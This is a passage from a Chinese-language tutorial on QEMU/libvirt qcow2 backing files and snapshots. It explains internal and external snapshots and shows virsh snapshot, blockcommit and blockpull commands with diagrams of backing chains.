codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># qemu-img create -b /export/vmimages/RootBase.img -f qcow2 \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  /export/vmimages/Fedora-guest-1.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># qemu-img create -b /export/vmimages/RootBase.img -f qcow2 \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  /export/vmimages/Fedora-guest-2.qcow2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>现在，上面创建出来的两个镜像 Fedora-guest-1 &amp; Fedora-guest-2 都可以用来启动一个虚拟机，继续我们的示例，现在我们需要创建一个f17的实例，但是这次我们需要创建的是具有完整的更新的实例，这时可以创建另外一个overlay（Fedora-guest-with-updates-1A）而这个overlay的backing file是'Fed-w-updates.qcow2'（一个包含了完整更新的镜像）:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># qemu-img create -b /export/vmimages/Fed-w-updates.qcow2 -f qcow2 \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   /export/vmimages/Fedora-guest-with-updates-1A.qcow2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>我们可以使用qemu-img命令来查看镜像的信息，包括虚拟磁盘大小，使用大小，backing file指向:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># qemu-img info /export/vmimages/Fedora-guest-with-updates-1A.qcow2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>注意: 最新版本的qemu-img可以递归查询到整条完整的链:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># qemu-img info --backing-chain /export/vmimages/Fedora-guest-with-updates-1A.qcow2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>名词解释Snapshot:</p><ul><li>内置快照（Internal Snapshots） -- 单个qcow2镜像文件存储了包括数据以及快照的状态信息，</li></ul><p>内置快照又可以细分一下:-</p><ul><li><p>内置磁盘快照（Internal disk snapshot）:</p></li><li><p>快照点的磁盘状态，数据和快照保存在单个qcow2文件中，虚拟机运行状态和关闭状态都可以创建.</p></li></ul><p>Libvirt 使用 'qemu-img' 命令创建关机状态的磁盘快照.Libvirt 使用 'savevm' 命令创建运行状态的磁盘快照.</p><ul><li>内置系统还原点（Internal system checkpoint）:</li></ul><p>内存状态，设备状态和磁盘状态，可以为运行中的虚拟机创建，所有信息都存储在同一个qcow2文件中，只有在运行状态才能创建内置系统还原点.</p><p>Libvirt 使用'savevm' 命令来创建这种快照</p><ul><li>外置快照（External Snapshots） -- 当一个快照被创建时，创建时当前的状态保存在当前使用的磁盘文件中，即成为一个backing file.此时一个新的overlay被创建出来保存往后的数据.</li></ul><p>这个也可以细分一下:-</p><ul><li>外置磁盘快照（External disk snapshot）: 磁盘的快照被保存在一个文件中，创建时间点以后的数据被记录到一个新的qcow2文件中.同样可以在运行和关闭状态创建.</li></ul><p>Libvirt 使用 'transaction' 命令来为运行状态创建这种快照.
Libvirt 使用'qemu-img' 命令为关闭状态创建这种快照(截止目前功能还在开发中).</p><ul><li>外置系统还原点（External system checkpoint）:</li></ul><p>虚拟机的磁盘状态将被保存到一个文件中，内存和设备的状态将被保存到另外一个新的文件中，</p><p>（这个功能也还在开发中）.</p><p>VM状态（VM state）:</p><p>保存运行状态虚拟机的内存设备状态信息至文件，可以通过此文件恢复到保存时的状态，有点类似系统的休眠.（注意创建VM状态保存的时候VM磁盘必须是未发生写入改动的）</p><p>Libvirt使用 'migrate' (to file)命令来完成VM状态转储.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="创建快照">创建快照<a class="hash-link" href="#创建快照" title="标题的直接链接">​</a></h2><p>每次产生一个外置snapshot，一个 /new/ overlay 镜像就会随之生成，而前一个镜像就变成了一个快照.</p><p>diskonly内置快照创建</p><p>假如需要为名为'f17vm1'的虚拟机创建一个运行态或关闭态的内置快照snap1</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># virsh snapshot-create-as f17vm1  snap1 snap1-desc</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>列出快照列表，使用<em>qemu-img</em>查看info</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># virsh snapshot-list f17vm1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># qemu-img info /home/kashyap/vmimages/f17vm1.qcow2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>disk-only外置快照创建 :</p><p>查看虚拟机磁盘列表</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># virsh domblklist f17-base</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Target     Source</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">---------------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vda        /export/vmimages/f17-base.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>创建外置disk-only磁盘快照（VM<em>运行态</em>）:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># virsh snapshot-create-as --domain f17-base snap1 snap1-desc \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--disk-only --diskspec vda,snapshot=external,file=/export/vmimages/sn1-of-f17-base.qcow2 \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--atomic</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Domain snapshot snap1 created</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">* 一旦上面的命令被执行，则原来的镜像f17-base将变为backing file，一个新的镜像被创建.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>现在再列表查看虚拟机磁盘，你会发现新产生的镜像已经投入使用.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># virsh domblklist f17-base</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Target     Source</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">----------------------------------------------------</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">vda        /export/vmimages/sn1-of-f17-base.qcow2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>快照回滚</p><p>截止写此文之时，回滚至'内置快照'(system checkpoint或disk-only)是可以使用的.</p><p>虚拟机f17vm1回滚至快照'snap1'</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># virsh snapshot-revert --domain f17vm1 snap1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>使用 snapshot-revert 回滚 '外置磁盘快照' 稍微复杂些，需要涉及到稍微复杂点的问题，需要考虑的是合并'base'至'top'还是合并'top'至'base'.也就是说，有两种方式可以选择，外置磁盘快照链的缩短可以使用 blockpull 或 blockcommit .截止目前上游社区仍然在努力完善这项功能.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="合并快照文件">合并快照文件<a class="hash-link" href="#合并快照文件" title="标题的直接链接">​</a></h2><p>外置快照非常有用，但这里有一个问题就是如何合并快照文件来缩短链的长度，如上所述这里</p><p>有两种方式:</p><ul><li>blockcommit: 从 top 合并数据到 base (即合并overlays至backing files).</li><li>blockpull: 将backing file数据合并至overlay中.从 base 到 top .</li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="blockcommit">blockcommit<a class="hash-link" href="#blockcommit" title="标题的直接链接">​</a></h3><p>blockcommit可以让你将'top'镜像(在同一条backing file链中)合并至底层的'base'镜像.一旦 blockcommit 执行完成，处于最上面的overlay链关系将被指向到底层的overlay或base.这在创建了很长一条链之后用来缩短链长度的时候十分有用.</p><p>下面来个图说明下:</p><p>我们现在有一个镜像叫'RootBase'，拥有4个外置快照，'Active'为当前VM写入数据的，</p><p>使用'blockcommit'可以有以下多种case :</p><p>合并Snap-1, Snap-2 and Snap-3 至 'RootBase'
只合并Snap-1 and Snap-2 至 RootBase
只合并Snap-1 至 RootBase
合并Snap-2 至 Snap-1
合并Snap-3 至 Snap-2
合并Snap-2 和 Snap-3 至 Snap-1
注: 合并'Active'层(最顶部的overlay)至backing_files的功能还在开发中.</p><p>(下图解释case (6))</p><p>Figure-3</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.------------.  .------------.  .------------.  .------------.  .------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |  |            |  |            |  |            |  |            |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| RootBase   &lt;---  Snap-1    &lt;---  Snap-2    &lt;---  Snap-3    &lt;---  Snap-4    |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |  |            |  |            |  |            |  | (Active)   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'------------'  '------------'  '------------'  '------------'  '------------'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                 /                  |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                /                   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                               /  commit data       |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                              /                     |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                             /                      |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                            /                       |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                           v           commit data  |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.------------.  .------------. &lt;--------------------'           .------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |  |            |                                  |            |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| RootBase   &lt;---  Snap-1    |&lt;---------------------------------|  Snap-4    |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |  |            |       Backing File               | (Active)   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'------------'  '------------'                                  '------------'</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>举个例子，有以下场景：</p><p>当前: <!-- -->[base]<!-- --> &lt;- sn1 &lt;- sn2 &lt;- sn3 &lt;- sn4(this is active)</p><p>目标: <!-- -->[base]<!-- --> &lt;- sn1 &lt;- sn4 (如此来丢弃sn2,sn3)</p><p>  下面有两种方式，method-a更快,method-b 慢些，但是sn2有效可用. (VM运行态).</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">        (method-a):</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">           # virsh blockcommit --domain f17 vda --base /export/vmimages/sn1.qcow2  \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">               --top /export/vmimages/sn3.qcow2 --wait --verbose</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>[OR]<!-- -->
(method-b):</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># virsh blockcommit --domain f17 vda  --base /export/vmimages/sn2.qcow2  \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    --top /export/vmimages/sn3.qcow2 --wait --verbose</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># virsh blockcommit --domain f17 vda  --base /export/vmimages/sn1.qcow2  \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    --top /export/vmimages/sn2.qcow2 --wait --verbose</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>注: 如果手工执行<em>qemu-img</em>命令完成的话, 现在还只能用method-b.
Figure-4</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.------------.  .------------.  .------------.  .------------.  .------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |  |            |  |            |  |            |  |            |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| RootBase   &lt;---  Snap-1    &lt;---  Snap-2    &lt;---  Snap-3    &lt;---  Snap-4    |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |  |            |  |            |  |            |  | (Active)   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'------------'  '------------'  '------------'  '------------'  '------------'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                  /                  |             |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                 /                   |             |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                /                    |             |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   commit data /         commit data |             |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">              /                      |             |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             /                       | commit data |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            v                        |             |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">.------------.&lt;----------------------|-------------'            .------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |&lt;----------------------'                          |            |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| RootBase   |                                                  |  Snap-4    |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |&lt;-------------------------------------------------| (Active)   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'------------'                  Backing File                    '------------'</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>上图演示了case1的blockcommit走向，现在sn4的backing file指向rootbase.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="blockpull">blockpull<a class="hash-link" href="#blockpull" title="标题的直接链接">​</a></h3><p>blockpull（qemu中也称作'block stream'）可以将backing合并至active，与blockcommit正好相反.截止目前只能将backing file合并至当前使用的active中，也就是说还不支持指定top的合并.
设想一个下面的场景:</p><p>Figure-5</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">.------------.  .------------.  .------------.  .------------.  .------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |  |            |  |            |  |            |  |            |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| RootBase   &lt;---  Snap-1    &lt;---  Snap-2    &lt;---  Snap-3    &lt;---  Snap-4    |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|            |  |            |  |            |  |            |  | (Active)   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">'------------'  '------------'  '------------'  '------------'  '------------'</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                         |                 |              \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                         |                 |               \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                         |                 |                \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                         |                 |                 \ stream data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                         |                 | stream data      \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                         | stream data     |                   \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                         |                 |                    v</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     .------------.      |                 '---------------&gt;  .------------.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     |            |      '---------------------------------&gt;  |            |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     | RootBase   |                                           |  Snap-4    |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     |            | &lt;---------------------------------------- | (Active)   |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     '------------'                 Backing File              '------------'</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path 